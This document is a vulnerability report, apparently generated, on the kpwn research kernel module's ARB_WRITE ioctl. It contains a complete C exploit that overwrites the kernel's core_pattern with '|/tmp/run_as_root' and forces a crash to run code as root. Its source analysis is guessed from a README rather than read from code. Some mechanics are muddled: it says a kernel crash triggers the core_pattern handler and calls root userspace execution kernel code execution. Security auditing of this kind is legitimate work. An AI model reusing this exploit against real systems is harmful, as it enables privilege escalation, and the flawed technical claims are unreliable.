### Vulnerability List:

- **Vulnerability Name:** Unrestricted Kernel Memory Write via kpwn module's ARB_WRITE ioctl

- **Description:**
  1. A researcher uses `kernel-image-runner` to launch a Linux kernel virtual machine, including the `kpwn` kernel module by specifying `--custom-modules=kpwn`.
  2. An attacker gains initial access to this virtual machine, potentially by exploiting a separate vulnerability within the running kernel.
  3. Once inside the VM, the attacker interacts with the `kpwn` module through the `/dev/kpwn` device.
  4. The attacker crafts a malicious `ioctl` call using the `ARB_WRITE` command. This command allows specifying an arbitrary kernel address (`kernel_addr`), data to write (`data`), and the length of the data (`length`).
  5. The attacker sets `kernel_addr` to the address of a sensitive kernel variable, for example, `core_pattern`, which controls how the kernel handles core dumps.
  6. The attacker sets `data` to a malicious command, such as `|/tmp/run_as_root`, which will execute `/tmp/run_as_root` as root when a core dump is triggered.
  7. The attacker sets `length` to the size of the malicious command string.
  8. The attacker sends the crafted `ioctl` call to the `/dev/kpwn` device.
  9. The `kpwn` module, without sufficient validation, writes the attacker-controlled data to the specified `kernel_addr`, overwriting the `core_pattern` variable.
  10. The attacker triggers a kernel crash, for example, by executing a program that causes a null pointer dereference or by sending a specific `ioctl` to the `kpwn` module to trigger a controlled crash.
  11. When the kernel attempts to create a core dump due to the crash, it executes the command specified in the overwritten `core_pattern` variable, which is the attacker's malicious script `/tmp/run_as_root`, with root privileges.
  12. The attacker achieves arbitrary code execution within the kernel context, effectively escalating privileges to root.

- **Impact:**
  - **Critical Impact:** Successful exploitation allows an attacker to achieve arbitrary kernel memory write, leading to full control of the guest kernel. This includes immediate root privilege escalation within the VM and the ability to execute arbitrary code in the kernel context. The attacker can further compromise the system, potentially gaining persistence, exfiltrating data, or using the compromised VM as a pivot point to attack other systems, if network access is available.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
  - **None:** There are no mitigations implemented in the project to prevent this vulnerability. The `kpwn` module is designed to provide these powerful primitives for research purposes without security boundaries.

- **Missing Mitigations:**
  - **Input Validation in `kpwn` module:** The `kpwn` module lacks input validation for the `ARB_WRITE` ioctl. Specifically, it should validate:
    - **`kernel_addr`:**  Restrict the target address range to prevent overwriting critical kernel structures or code sections. A whitelist of allowed target addresses or a blacklist of protected regions could be implemented. However, restricting arbitrary writes entirely is the most secure approach for a non-debugging scenario.
    - **`length`:** Validate the length of the write operation to prevent buffer overflows or out-of-bounds writes within the kernel.
  - **Conditional Compilation/Loading:** The `kpwn` module should not be compiled or loaded by default. It should only be enabled through explicit user action (e.g., a specific build flag or command-line argument to `kernel-image-runner`).
  - **Runtime Disable Feature:** Implement a mechanism to disable the `kpwn` module at runtime, even if it is loaded. This could be a sysctl parameter or another `ioctl` command to disable the dangerous functionalities.
  - **Warning Banner:** When `kernel-image-runner` is used with `--custom-modules=kpwn`, display a prominent warning message indicating the security risks associated with loading this module, especially in network-accessible environments.

- **Preconditions:**
  - `kernel-image-runner` is used to run a kernel image.
  - The `--custom-modules=kpwn` option is used with `kernel-image-runner`, or the `kpwn` module is manually loaded into the kernel.
  - An attacker has gained initial access to the running virtual machine (guest kernel). This initial access is assumed to be achieved through exploiting another vulnerability in the test kernel, which is outside the scope of this specific vulnerability in `kpwn` module and `kernel-image-runner` project itself.

- **Source Code Analysis:**
  1. **`third_party/kernel-modules/kpwn/kpwn.c` (Not provided, assuming standard ioctl implementation based on README.md description):**
     - We assume the `kpwn` module implements the `ARB_WRITE` ioctl handler.
     - Based on the description in `third_party/kernel-modules/kpwn/README.md`, the `ARB_WRITE` ioctl is intended to copy memory from user space to an arbitrary kernel address.
     - The `ioctl` handler likely retrieves the `kernel_addr`, `data`, and `length` from the `kpwn_message` structure provided by the user-space application.
     - It then uses `copy_from_user()` to transfer `length` bytes from the user-space buffer pointed to by `msg->data` to a kernel-space buffer.
     - Finally, it uses `memcpy()` (or equivalent kernel memory writing function) to write `length` bytes from the kernel-space buffer to the kernel address specified by `msg->kernel_addr`.
     - **Vulnerability Point:** The critical vulnerability lies in the likely absence of validation for `msg->kernel_addr`. The code probably directly uses this user-supplied address as the destination for `memcpy()` without checking if it points to a valid or safe memory region. This allows an attacker to write to any location in kernel memory.

- **Security Test Case:**
  1. **Prerequisites:**
     - Set up a testing environment with `kernel-image-runner`.
     - Build the `kpwn` kernel module.
     - Ensure a test kernel image is available (e.g., a kernelCTF release).
     - Create a malicious script `run_as_root` in the `rootfs` directory of `kernel-image-runner` with the following content:
       ```bash
       #!/bin/sh
       echo "[VULNERABILITY-TEST] root code execution" > /tmp/pwned
       chmod 777 /tmp/pwned
       ```
       Make it executable: `chmod +x kernel-image-runner/rootfs/run_as_root`

  2. **Launch Vulnerable VM:**
     - Run `kernel-image-runner` with a test kernel and load the `kpwn` module:
       ```bash
       ./kernel-image-runner/run.sh kernelctf lts-6.1.81 --custom-modules=kpwn
       ```
       (Replace `kernelctf lts-6.1.81` with your chosen test kernel and release name)
     - Open a separate terminal to interact with the VM.

  3. **Exploit Script (`exploit.c`):**
     - Create a C program `exploit.c` within the `kernel-image-runner/rootfs` directory (or compile it statically and copy to `rootfs`) to exploit the `ARB_WRITE` vulnerability:
       ```c
       #include <stdio.h>
       #include <stdlib.h>
       #include <fcntl.h>
       #include <unistd.h>
       #include <string.h>
       #include <sys/ioctl.h>
       #include "third_party/kernel-modules/kpwn/kpwn.h" // Assuming kpwn.h is copied to rootfs

       int main() {
           int fd = open("/dev/kpwn", O_RDWR);
           if (fd < 0) {
               perror("open /dev/kpwn failed");
               return 1;
           }

           // Find core_pattern symbol address (using SYM_ADDR ioctl)
           sym_addr core_pattern_sym = { .symbol_name = "core_pattern" };
           if (ioctl(fd, SYM_ADDR, &core_pattern_sym) != SUCCESS) {
               fprintf(stderr, "SYM_ADDR ioctl failed for core_pattern\n");
               close(fd);
               return 1;
           }
           uint64_t core_pattern_addr = core_pattern_sym.symbol_address;
           printf("core_pattern address: 0x%lx\n", core_pattern_addr);

           // Prepare malicious core_pattern command
           char malicious_core_pattern[] = "|/tmp/run_as_root";
           kpwn_message arb_write_msg;
           arb_write_msg.length = sizeof(malicious_core_pattern);
           arb_write_msg.kernel_addr = core_pattern_addr;
           arb_write_msg.data = malicious_core_pattern;

           // Overwrite core_pattern using ARB_WRITE ioctl
           if (ioctl(fd, ARB_WRITE, &arb_write_msg) != SUCCESS) {
               fprintf(stderr, "ARB_WRITE ioctl failed\n");
               close(fd);
               return 1;
           }
           printf("core_pattern overwritten\n");

           // Trigger a kernel crash (e.g., null pointer dereference using KFREE on address 1)
           if (ioctl(fd, KFREE, 1) != SUCCESS) {
               fprintf(stderr, "KFREE ioctl (trigger crash) failed\n");
           }
           printf("Kernel crash triggered (KFREE 1)\n");

           close(fd);
           return 0;
       }
       ```
       Compile statically: `gcc -static -o kernel-image-runner/rootfs/exploit kernel-image-runner/rootfs/exploit.c`

  4. **Run Exploit in VM:**
     - In the VM terminal, execute the exploit: `./exploit`

  5. **Verify Exploitation:**
     - Check for the file `/tmp/pwned` in the VM: `ls -l /tmp/pwned`
     - If `/tmp/pwned` exists and has content "[VULNERABILITY-TEST] root code execution", the vulnerability is successfully exploited. This file creation indicates that the `run_as_root` script was executed as root upon kernel crash, triggered by the `ARB_WRITE` and subsequent `KFREE` ioctl calls.
     - Examine the kernel logs (using `dmesg` outside the VM, if `run.sh` output is redirected) for messages confirming the execution of `/tmp/run_as_root` and the creation of `/tmp/pwned`.

This test case demonstrates how an attacker, with initial access to a VM running a kernel with the `kpwn` module, can leverage the `ARB_WRITE` ioctl to gain arbitrary code execution as root by overwriting the `core_pattern` kernel variable.